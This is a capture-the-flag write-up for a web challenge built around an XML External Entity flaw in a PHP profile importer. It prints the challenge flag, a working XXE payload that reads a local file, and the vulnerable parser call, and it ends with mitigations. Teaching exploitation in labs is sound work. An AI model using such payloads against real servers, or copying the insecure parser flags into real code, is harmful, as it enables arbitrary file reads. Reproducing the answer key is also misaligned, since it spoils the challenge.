# Challenge Name:
external entity

## Description:
could you abuse my profile importer website?

## Category:
Web

## File:
./dist.zip

## Flag:
`STORM{xxe_abuse_via_upload_form_00efd9ab12}`

## Points:
500

## Author:
k.eii

## Vulnerability Analysis
This challenge demonstrates a classic XML External Entity (XXE) vulnerability. The web application allows users to upload XML files, which are then parsed on the server. The backend does not disable external entity resolution, allowing attackers to read sensitive files.

### Exploitation Steps
1. **Craft a Malicious XML File:**
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE profile [
     <!ELEMENT profile ANY>
     <!ENTITY flag SYSTEM "file:///var/flag/flag.txt">
   ]>
   <profile>
       <name>&flag;</name>
       <email>example@example.com</email>
       <bio>aaaaaaa</bio>
   </profile>
   ```
2. **Upload the XML File:**
   Use the profile import form to upload the malicious XML file.
3. **Retrieve the Flag:**
   The server processes the XML and replaces `&flag;` with the contents of `/var/flag/flag.txt`, exposing the flag.

### Why This Works
- The XML parser is not configured to disable external entity resolution.
- The application trusts user-supplied XML and processes it without sanitization.

## Vulnerability Explanation
The vulnerability is present in the backend code that processes uploaded XML files. Specifically, in `src/src/xml-handler.php`, the following code is used:

```php
$dom = new DOMDocument();
$dom->loadXML($xmlContent, LIBXML_NOENT | LIBXML_DTDLOAD);
```

- The `LIBXML_NOENT` flag tells the XML parser to substitute entities, and `LIBXML_DTDLOAD` allows loading external DTDs. This means any external entity defined in the uploaded XML will be resolved and its contents included in the parsed output.
- The code does not disable external entity resolution or validate the contents of the XML beyond checking the MIME type.
- As a result, an attacker can define an external entity in their XML (such as `&flag;`), which will be replaced with the contents of any file the web server can read (e.g., `/var/flag/flag.txt`).

This is a textbook XML External Entity (XXE) vulnerability, allowing attackers to read arbitrary files from the server.

### Mitigation
- Always disable external entity resolution in XML parsers (e.g., `libxml_disable_entity_loader(true)` in PHP).
- Validate and sanitize all user-supplied XML.
- Avoid using XML for user uploads unless absolutely necessary.

## PoC
See `poc.xml` for a working exploit example.